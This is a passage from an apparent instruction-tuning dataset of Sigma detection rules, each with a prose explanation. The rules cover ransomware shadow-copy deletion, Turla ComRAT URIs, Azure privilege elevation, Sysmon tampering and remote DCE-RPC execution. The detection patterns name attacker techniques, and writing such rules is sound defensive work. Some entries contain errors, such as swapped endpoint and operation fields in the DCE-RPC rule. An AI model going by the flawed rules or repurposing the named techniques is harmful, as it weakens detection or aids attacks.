      "answer": "In order to detect DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn't named TeamViewer (sometimes used by threat actors for obfuscation), you should:\n\nMonitor DNS query logs from Windows systems for specific requests that are indicative of interaction with TeamViewer domains. These DNS requests are particularly aimed at querying 'taf.teamviewer.com' and 'udp.ping.teamviewer.com'. It's essential to scrutinize programs initiating these DNS queries to ensure they are genuinely associated with TeamViewer. If the initiating program image does not contain the name 'TeamViewer', it may signal an attempt at obfuscation by threat actors intending to disguise malicious activities. It is important to be aware of potential false positives, which can emerge from unknown binary names of TeamViewer or other legitimate programs that may also query the observed domains. This monitoring activity is of medium priority and aligns with tactics and techniques that involve the utilization of legitimate software (such as TeamViewer) by malicious actors in their operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Firewall Policy is Modified or Deleted..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when a Firewall Policy is Modified or Deleted, you should: Monitor Azure Activity Logs for specific operations that indicate a firewall policy is being modified or deleted. Specifically, look for log entries where the operation name matches one of the following: MICROSOFT.NETWORK/FIREWALLPOLICIES/WRITE, which indicates a write operation to a firewall policy; MICROSOFT.NETWORK/FIREWALLPOLICIES/JOIN/ACTION, which suggests a join action on firewall policies; MICROSOFT.NETWORK/FIREWALLPOLICIES/CERTIFICATES/ACTION, pointing towards actions on certificates within firewall policies; and MICROSOFT.NETWORK/FIREWALLPOLICIES/DELETE, indicating a firewall policy deletion. Evaluation of these operations is essential to detect unauthorized or suspicious modifications or deletion of firewall configurations, which could weaken the network's security posture. However, it's important to consider potential false positives such as legitimate administrative activities. Verify the identity of the user and the legitimacy of their actions by cross-referencing with known system administrator activities, user agents, and hostnames that are authorized to make such changes. Any modification or deletion by unfamiliar users or entities should be investigated further. Adjust and refine detection criteria to minimize false positives without overlooking unauthorized changes. This monitoring process is crucial for maintaining the integrity of firewall policies and by extension, the overall security of the network terrain.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName:\n            - MICROSOFT.NETWORK/FIREWALLPOLICIES/WRITE\n            - MICROSOFT.NETWORK/FIREWALLPOLICIES/JOIN/ACTION\n            - MICROSOFT.NETWORK/FIREWALLPOLICIES/CERTIFICATES/ACTION\n            - MICROSOFT.NETWORK/FIREWALLPOLICIES/DELETE\n    condition: selection\nfalsepositives:\n    - Firewall Policy being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Firewall Policy modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName:\n            - MICROSOFT.NETWORK/FIREWALLPOLICIES/WRITE\n            - MICROSOFT.NETWORK/FIREWALLPOLICIES/JOIN/ACTION\n            - MICROSOFT.NETWORK/FIREWALLPOLICIES/CERTIFICATES/ACTION\n            - MICROSOFT.NETWORK/FIREWALLPOLICIES/DELETE\n    condition: selection\nfalsepositives:\n    - Firewall Policy being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Firewall Policy modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "Firewall Policy is Modified or Deleted.",
      "answer": "In order to identify when a Firewall Policy is Modified or Deleted, you should: Monitor Azure Activity Logs for specific operations that indicate a firewall policy is being modified or deleted. Specifically, look for log entries where the operation name matches one of the following: MICROSOFT.NETWORK/FIREWALLPOLICIES/WRITE, which indicates a write operation to a firewall policy; MICROSOFT.NETWORK/FIREWALLPOLICIES/JOIN/ACTION, which suggests a join action on firewall policies; MICROSOFT.NETWORK/FIREWALLPOLICIES/CERTIFICATES/ACTION, pointing towards actions on certificates within firewall policies; and MICROSOFT.NETWORK/FIREWALLPOLICIES/DELETE, indicating a firewall policy deletion. Evaluation of these operations is essential to detect unauthorized or suspicious modifications or deletion of firewall configurations, which could weaken the network's security posture. However, it's important to consider potential false positives such as legitimate administrative activities. Verify the identity of the user and the legitimacy of their actions by cross-referencing with known system administrator activities, user agents, and hostnames that are authorized to make such changes. Any modification or deletion by unfamiliar users or entities should be investigated further. Adjust and refine detection criteria to minimize false positives without overlooking unauthorized changes. This monitoring process is crucial for maintaining the integrity of firewall policies and by extension, the overall security of the network terrain."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to delete Windows Volume Shadow Copies with PowerShell code and Get-WMIObject, a technique used by numerous ransomware families such as Sodinokibi/REvil, you should: Monitor PowerShell script logs, ensuring the Script Block Logging feature is enabled, to detect the use of PowerShell commands that query 'Win32_Shadowcopy' via 'Get-WmiObject', and subsequently call '.Delete()' on it. This activity is highly indicative of an attack aiming to prevent system recovery by deleting shadow copies, which is a common step in the operation of ransomware. Detection focuses on the presence of these specific command components within scripts, highlighting potential compromise attempts. Be vigilant for false positives, although they are currently unspecified, and consider these detections as high priority due to the severity of the potential impact associated with ransomware attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Get-WmiObject'\n            - 'Win32_Shadowcopy'\n            - '.Delete()'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Get-WmiObject'\n            - 'Win32_Shadowcopy'\n            - '.Delete()'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil",
      "answer": "In order to delete Windows Volume Shadow Copies with PowerShell code and Get-WMIObject, a technique used by numerous ransomware families such as Sodinokibi/REvil, you should: Monitor PowerShell script logs, ensuring the Script Block Logging feature is enabled, to detect the use of PowerShell commands that query 'Win32_Shadowcopy' via 'Get-WmiObject', and subsequently call '.Delete()' on it. This activity is highly indicative of an attack aiming to prevent system recovery by deleting shadow copies, which is a common step in the operation of ransomware. Detection focuses on the presence of these specific command components within scripts, highlighting potential compromise attempts. Be vigilant for false positives, although they are currently unspecified, and consider these detections as high priority due to the severity of the potential impact associated with ransomware attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Monitor Windows PowerShell script blocks logs to identify instances where 'SyncAppvPublishingServer.exe' is mentioned. This monitoring is predicated on Script Block Logging being enabled on the system. When 'SyncAppvPublishingServer.exe' is detected within these script block texts, it may indicate an attempt to bypass PowerShell execution restrictions typically employed by adversaries. It's important to note, however, that legitimate App-V clients may also trigger this detection, so these instances should be considered as potential false positives. This strategy is aimed at identifying medium-level security threats associated with this particular tactic.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'SyncAppvPublishingServer.exe'\n    condition: selection\nfalsepositives:\n    - App-V clients\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'SyncAppvPublishingServer.exe'\n    condition: selection\nfalsepositives:\n    - App-V clients\nlevel: medium\n",
      "question": "SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
      "answer": "In order to detect SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Monitor Windows PowerShell script blocks logs to identify instances where 'SyncAppvPublishingServer.exe' is mentioned. This monitoring is predicated on Script Block Logging being enabled on the system. When 'SyncAppvPublishingServer.exe' is detected within these script block texts, it may indicate an attempt to bypass PowerShell execution restrictions typically employed by adversaries. It's important to note, however, that legitimate App-V clients may also trigger this detection, so these instances should be considered as potential false positives. This strategy is aimed at identifying medium-level security threats associated with this particular tactic."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an executable in the Windows folder accessing github.com.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an executable in the Windows folder accessing github.com, you should: Monitor network connections sourced from the Windows operating environment, specifically focusing on instances where network traffic is initiated by executables located within the C:\\Windows\\ directory. Special attention should be paid to network connections where the destination hostname ends with either '.github.com' or '.githubusercontent.com', signifying an attempt to access GitHub related domains. It is essential to acknowledge that while this activity can indicate a security concern, there are instances where it might not pose a risk, such as unspecified circumstances or network activities related to '@subTee'. This detection strategy has a high importance due to its potential implication in malicious activities associated with the use of GitHub for distributing or controlling malware, thus closely aligning with tactics and techniques that involve execution, command and control mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        DestinationHostname|endswith:\n            - '.github.com'\n            - '.githubusercontent.com'\n        Image|startswith: 'C:\\Windows\\'\n    condition: selection\nfalsepositives:\n    - Unknown\n    - '@subTee in your network'\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        DestinationHostname|endswith:\n            - '.github.com'\n            - '.githubusercontent.com'\n        Image|startswith: 'C:\\Windows\\'\n    condition: selection\nfalsepositives:\n    - Unknown\n    - '@subTee in your network'\nlevel: high\n",
      "question": "an executable in the Windows folder accessing github.com",
      "answer": "In order to detect an executable in the Windows folder accessing github.com, you should: Monitor network connections sourced from the Windows operating environment, specifically focusing on instances where network traffic is initiated by executables located within the C:\\Windows\\ directory. Special attention should be paid to network connections where the destination hostname ends with either '.github.com' or '.githubusercontent.com', signifying an attempt to access GitHub related domains. It is essential to acknowledge that while this activity can indicate a security concern, there are instances where it might not pose a risk, such as unspecified circumstances or network activities related to '@subTee'. This detection strategy has a high importance due to its potential implication in malicious activities associated with the use of GitHub for distributing or controlling malware, thus closely aligning with tactics and techniques that involve execution, command and control mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting user has been elevated to manage all Azure Subscriptions.\nThis change should be investigated immediately if it isn't planned.\nThis setting could allow an attacker access to Azure subscriptions in your environment.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a user has been elevated to manage all Azure Subscriptions, you should: Focus on monitoring the Azure activity logs specifically for instances where the `operationName` is marked as `MICROSOFT.AUTHORIZATION/ELEVATEACCESS/ACTION`. This particular operation indicates that a user's permissions have been elevated to manage all Azure subscriptions. Such a change is significant and should be investigated promptly unless it has been previously approved by a System Administrator. This action is tagged under tactics and techniques that typically relate to privilege escalation and potentially unauthorized access within an organization's cloud environment. Given that this permission elevation could allow an attacker to gain extensive access to Azure subscriptions, it is marked with a high level of criticality. Instances detected without prior approval are considered suspicious and warrant immediate review to ensure they are not part of a malicious attempt to gain elevated access within your environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName: MICROSOFT.AUTHORIZATION/ELEVATEACCESS/ACTION\n    condition: selection\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName: MICROSOFT.AUTHORIZATION/ELEVATEACCESS/ACTION\n    condition: selection\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: high\n",
      "question": "user has been elevated to manage all Azure Subscriptions.\nThis change should be investigated immediately if it isn't planned.\nThis setting could allow an attacker access to Azure subscriptions in your environment.\n",
      "answer": "In order to detect when a user has been elevated to manage all Azure Subscriptions, you should: Focus on monitoring the Azure activity logs specifically for instances where the `operationName` is marked as `MICROSOFT.AUTHORIZATION/ELEVATEACCESS/ACTION`. This particular operation indicates that a user's permissions have been elevated to manage all Azure subscriptions. Such a change is significant and should be investigated promptly unless it has been previously approved by a System Administrator. This action is tagged under tactics and techniques that typically relate to privilege escalation and potentially unauthorized access within an organization's cloud environment. Given that this permission elevation could allow an attacker to gain extensive access to Azure subscriptions, it is marked with a high level of criticality. Instances detected without prior approval are considered suspicious and warrant immediate review to ensure they are not part of a malicious attempt to gain elevated access within your environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes in Sysmon driver altitude. If the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes in Sysmon driver altitude. If the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot, you should: Monitor the Windows registry for any modifications to the System configuration settings, specifically focusing on event types classified as SetValue operations. This effort should target registry keys under 'HKLM\\SYSTEM\\CurrentControlSet\\' path, especially those appended with '\\Instances\\Sysmon Instance\\Altitude'. Such changes could indicate attempts to alter the default loading altitude of the Sysmon driver, which can prevent its proper initialization during the system boot. It\u2019s essential to be aware of potential legitimate driver altitude adjustments that might result in false positives, so any change observed should be carefully evaluated to confirm its authenticity and impact. Considering the significant level of threat this alteration poses to system monitoring capabilities, emphasis should be on prompt detection and verification.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\SYSTEM\\CurrentControlSet\\'\n        TargetObject|endswith: '\\Instances\\Sysmon Instance\\Altitude'\n    condition: selection\nfalsepositives:\n    - Legitimate driver altitude change to hide sysmon\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\SYSTEM\\CurrentControlSet\\'\n        TargetObject|endswith: '\\Instances\\Sysmon Instance\\Altitude'\n    condition: selection\nfalsepositives:\n    - Legitimate driver altitude change to hide sysmon\nlevel: high\n",
      "question": "changes in Sysmon driver altitude. If the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot.",
      "answer": "In order to detect changes in Sysmon driver altitude. If the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot, you should: Monitor the Windows registry for any modifications to the System configuration settings, specifically focusing on event types classified as SetValue operations. This effort should target registry keys under 'HKLM\\SYSTEM\\CurrentControlSet\\' path, especially those appended with '\\Instances\\Sysmon Instance\\Altitude'. Such changes could indicate attempts to alter the default loading altitude of the Sysmon driver, which can prevent its proper initialization during the system boot. It\u2019s essential to be aware of potential legitimate driver altitude adjustments that might result in false positives, so any change observed should be carefully evaluated to confirm its authenticity and impact. Considering the significant level of threat this alteration poses to system monitoring capabilities, emphasis should be on prompt detection and verification."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Log4J Wstomcat process execution as seen in Mint Sandstorm activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Log4J Wstomcat process execution as seen in Mint Sandstorm activity, you should: Focus on monitoring process creation events within Windows systems. Specifically, look for instances where the Wstomcat service ('ws_tomcatservice.exe') is listed as the parent image and is responsible for starting the 'repadmin.exe' process. This particular pattern of activity is indicative of the tactics and techniques associated with Mint Sandstorm activity, where adversaries might exploit Log4J vulnerabilities through specific process execution chains. It is important to pay close attention to these events, although be mindful that there might be cases where similar activity does not signify malicious intent, but such instances are currently unknown. The severity of detecting this activity is considered high, underscoring the potential risk involved.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\ws_tomcatservice.exe'\n        Image|endswith: '\\repadmin.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\ws_tomcatservice.exe'\n        Image|endswith: '\\repadmin.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Log4J Wstomcat process execution as seen in Mint Sandstorm activity",
      "answer": "In order to detect Log4J Wstomcat process execution as seen in Mint Sandstorm activity, you should: Focus on monitoring process creation events within Windows systems. Specifically, look for instances where the Wstomcat service ('ws_tomcatservice.exe') is listed as the parent image and is responsible for starting the 'repadmin.exe' process. This particular pattern of activity is indicative of the tactics and techniques associated with Mint Sandstorm activity, where adversaries might exploit Log4J vulnerabilities through specific process execution chains. It is important to pay close attention to these events, although be mindful that there might be cases where similar activity does not signify malicious intent, but such instances are currently unknown. The severity of detecting this activity is considered high, underscoring the potential risk involved."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious failed logins with different user accounts from a single source system.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious failed logins with different user accounts from a single source system, you should monitor Windows security event logs for specific event IDs that indicate failed login attempts. Focus on Event IDs 529 and 4625, which are critical for identifying unsuccessful login efforts. It is important to track these events when any user name (indicated by '*') attempts to log in from any workstation (also indicated by '*'). To effectively identify suspicious activity, analyze the logs to find instances where more than three failed login attempts occur with different user accounts from the same workstation. This approach helps in flagging potentially malicious attempts to gain unauthorized access. However, be mindful that certain environments such as terminal servers, jump servers, Citrix server farms, or workstations with frequently changing users may generate false positives due to the nature of their legitimate multi-user access patterns. This detection mechanism is of medium severity level and aids in identifying threat actors employing tactics that align with Credential Access through Brute Force methods, by observing and responding to anomalous login patterns.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID:\n            - 529\n            - 4625\n        TargetUserName: '*'\n        WorkstationName: '*'\n    condition: selection1 | count(TargetUserName) by WorkstationName > 3\nfalsepositives:\n    - Terminal servers\n    - Jump servers\n    - Other multiuser systems like Citrix server farms\n    - Workstations with frequently changing users\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID:\n            - 529\n            - 4625\n        TargetUserName: '*'\n        WorkstationName: '*'\n    condition: selection1 | count(TargetUserName) by WorkstationName > 3\nfalsepositives:\n    - Terminal servers\n    - Jump servers\n    - Other multiuser systems like Citrix server farms\n    - Workstations with frequently changing users\nlevel: medium\n",
      "question": "suspicious failed logins with different user accounts from a single source system",
      "answer": "In order to detect suspicious failed logins with different user accounts from a single source system, you should monitor Windows security event logs for specific event IDs that indicate failed login attempts. Focus on Event IDs 529 and 4625, which are critical for identifying unsuccessful login efforts. It is important to track these events when any user name (indicated by '*') attempts to log in from any workstation (also indicated by '*'). To effectively identify suspicious activity, analyze the logs to find instances where more than three failed login attempts occur with different user accounts from the same workstation. This approach helps in flagging potentially malicious attempts to gain unauthorized access. However, be mindful that certain environments such as terminal servers, jump servers, Citrix server farms, or workstations with frequently changing users may generate false positives due to the nature of their legitimate multi-user access patterns. This detection mechanism is of medium severity level and aids in identifying threat actors employing tactics that align with Credential Access through Brute Force methods, by observing and responding to anomalous login patterns."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Turla ComRAT patterns.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Turla ComRAT patterns, you should focus on the proxy logs for any HTTP requests that contain a specific pattern in the request URI. Specifically, look for requests where the URI includes '/index/index.php?h=' as part of the query string. The presence of this pattern in the URI can indicate an attempt to communicate with a command and control server, which is associated with the Turla ComRAT malware activity. While it's crucial to monitor for this pattern, it's also important to note that there could be unknown false positives, meaning that some legitimate traffic might inadvertently match this pattern despite not being malicious. The level of concern for this detection is classified as high, highlighting the importance of promptly investigating any matches to prevent potential breaches or malicious activities within the network.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri|contains: '/index/index.php\\?h='\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri|contains: '/index/index.php\\?h='\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Turla ComRAT patterns",
      "answer": "In order to detect Turla ComRAT patterns, you should focus on the proxy logs for any HTTP requests that contain a specific pattern in the request URI. Specifically, look for requests where the URI includes '/index/index.php?h=' as part of the query string. The presence of this pattern in the URI can indicate an attempt to communicate with a command and control server, which is associated with the Turla ComRAT malware activity. While it's crucial to monitor for this pattern, it's also important to note that there could be unknown false positives, meaning that some legitimate traffic might inadvertently match this pattern despite not being malicious. The level of concern for this detection is classified as high, highlighting the importance of promptly investigating any matches to prevent potential breaches or malicious activities within the network."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution techniques on the remote system via Windows DCE-RPC functions, you should monitor for specific endpoint and operation pairs in Zeek logs from the DCE_RPC service. These pairs signify potentially malicious activity and are crucial for identifying attempts to execute code remotely. The endpoints and operations to be vigilant for include:\n\n1. The 'JobAdd' operation within the 'atsvc' endpoint, which indicates an attempt to add a job to the AT service schedule.\n2. Operations 'SchRpcEnableTask', 'SchRpcRegisterTask', and 'SchRpcRun' within the 'ITaskSchedulerService' endpoint, pointing towards manipulation of scheduled tasks possibly to maintain persistence or execute malicious tasks at specific times.\n3. The 'ExecMethod' and 'ExecMethodAsync' operations within the 'IWbemServices' endpoint, which are indicative of executing methods on WMI services, potentially for executing code.\n4. Operations 'CreateServiceA', 'CreateServiceW', 'StartServiceA', and 'StartServiceW' within the 'svcctl' endpoint, that suggest creation and starting of a new service, a common tactic for persistent malware execution or system manipulation.\n\nThese activities, when identified, should be investigated to distinguish between benign Windows administration tasks or script/software management activities and malicious actions. It is important to be aware that these logs can generate false positives, such as when administrators are performing legitimate tasks for maintenance or troubleshooting, or when management scripts or software operate as designed.\n\nMonitoring for these patterns carries a medium level of importance and is linked with various MITRE ATT&CK tactics and techniques, primarily focusing on the execution phase of an attack. Each observed operation can serve as an indicator of compromise (IoC) and warrants further investigation to ensure the security of the Windows environment against unauthorized execution techniques.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: zeek\n    service: dce_rpc\ndetection:\n    op1:\n        endpoint: 'JobAdd'\n        operation: 'atsvc'\n    op2:\n        endpoint: 'ITaskSchedulerService'\n        operation: 'SchRpcEnableTask'\n    op3:\n        endpoint: 'ITaskSchedulerService'\n        operation: 'SchRpcRegisterTask'\n    op4:\n        endpoint: 'ITaskSchedulerService'\n        operation: 'SchRpcRun'\n    op5:\n        endpoint: 'IWbemServices'\n        operation: 'ExecMethod'\n    op6:\n        endpoint: 'IWbemServices'\n        operation: 'ExecMethodAsync'\n    op7:\n        endpoint: 'svcctl'\n        operation: 'CreateServiceA'\n    op8:\n        endpoint: 'svcctl'\n        operation: 'CreateServiceW'\n    op9:\n        endpoint: 'svcctl'\n        operation: 'StartServiceA'\n    op10:\n        endpoint: 'svcctl'\n        operation: 'StartServiceW'\n    condition: 1 of op*\nfalsepositives:\n    - Windows administrator tasks or troubleshooting\n    - Windows management scripts or software\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: zeek\n    service: dce_rpc\ndetection:\n    op1:\n        endpoint: 'JobAdd'\n        operation: 'atsvc'\n    op2:\n        endpoint: 'ITaskSchedulerService'\n        operation: 'SchRpcEnableTask'\n    op3:\n        endpoint: 'ITaskSchedulerService'\n        operation: 'SchRpcRegisterTask'\n    op4:\n        endpoint: 'ITaskSchedulerService'\n        operation: 'SchRpcRun'\n    op5:\n        endpoint: 'IWbemServices'\n        operation: 'ExecMethod'\n    op6:\n        endpoint: 'IWbemServices'\n        operation: 'ExecMethodAsync'\n    op7:\n        endpoint: 'svcctl'\n        operation: 'CreateServiceA'\n    op8:\n        endpoint: 'svcctl'\n        operation: 'CreateServiceW'\n    op9:\n        endpoint: 'svcctl'\n        operation: 'StartServiceA'\n    op10:\n        endpoint: 'svcctl'\n        operation: 'StartServiceW'\n    condition: 1 of op*\nfalsepositives:\n    - Windows administrator tasks or troubleshooting\n    - Windows management scripts or software\nlevel: medium\n",
      "question": "Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE",
      "answer": "In order to detect execution techniques on the remote system via Windows DCE-RPC functions, you should monitor for specific endpoint and operation pairs in Zeek logs from the DCE_RPC service. These pairs signify potentially malicious activity and are crucial for identifying attempts to execute code remotely. The endpoints and operations to be vigilant for include:\n\n1. The 'JobAdd' operation within the 'atsvc' endpoint, which indicates an attempt to add a job to the AT service schedule.\n2. Operations 'SchRpcEnableTask', 'SchRpcRegisterTask', and 'SchRpcRun' within the 'ITaskSchedulerService' endpoint, pointing towards manipulation of scheduled tasks possibly to maintain persistence or execute malicious tasks at specific times.\n3. The 'ExecMethod' and 'ExecMethodAsync' operations within the 'IWbemServices' endpoint, which are indicative of executing methods on WMI services, potentially for executing code.\n4. Operations 'CreateServiceA', 'CreateServiceW', 'StartServiceA', and 'StartServiceW' within the 'svcctl' endpoint, that suggest creation and starting of a new service, a common tactic for persistent malware execution or system manipulation.\n\nThese activities, when identified, should be investigated to distinguish between benign Windows administration tasks or script/software management activities and malicious actions. It is important to be aware that these logs can generate false positives, such as when administrators are performing legitimate tasks for maintenance or troubleshooting, or when management scripts or software operate as designed.\n\nMonitoring for these patterns carries a medium level of importance and is linked with various MITRE ATT&CK tactics and techniques, primarily focusing on the execution phase of an attack. Each observed operation can serve as an indicator of compromise (IoC) and warrants further investigation to ensure the security of the Windows environment against unauthorized execution techniques."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when adversaries may abuse msiexec.exe to proxy execution of malicious payloads, where msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi), you should: Monitor network connections from Windows systems, focusing on events where a process is initiated (flagged as 'true' for initiation) and the process image name ends with '\\msiexec.exe', which is indicative of the Windows Installer utility being executed. This monitoring is essential because malicious actors can misuse msiexec.exe to run harmful payloads under the guise of legitimate software installations. It's crucial to be aware of false positives, which can occur when msiexec.exe is used over networks for legitimate installation purposes. The severity of this kind of suspicious activity is considered medium, and such monitoring helps to catch potential misuse related to execution proxying techniques. Tags associated with this detection strategy include execution tactics and potentially the use of execution through API techniques, although specific MITRE ATT&CK tactic and technique tags were not provided in the description, common associations would be with 'Execution' and possibly 'Command and Scripting Interpreter'.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        Image|endswith: '\\msiexec.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate msiexec over networks\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        Image|endswith: '\\msiexec.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate msiexec over networks\nlevel: medium\n",
      "question": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n",
      "answer": "In order to detect when adversaries may abuse msiexec.exe to proxy execution of malicious payloads, where msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi), you should: Monitor network connections from Windows systems, focusing on events where a process is initiated (flagged as 'true' for initiation) and the process image name ends with '\\msiexec.exe', which is indicative of the Windows Installer utility being executed. This monitoring is essential because malicious actors can misuse msiexec.exe to run harmful payloads under the guise of legitimate software installations. It's crucial to be aware of false positives, which can occur when msiexec.exe is used over networks for legitimate installation purposes. The severity of this kind of suspicious activity is considered medium, and such monitoring helps to catch potential misuse related to execution proxying techniques. Tags associated with this detection strategy include execution tactics and potentially the use of execution through API techniques, although specific MITRE ATT&CK tactic and technique tags were not provided in the description, common associations would be with 'Execution' and possibly 'Command and Scripting Interpreter'."
    }
  },
  {
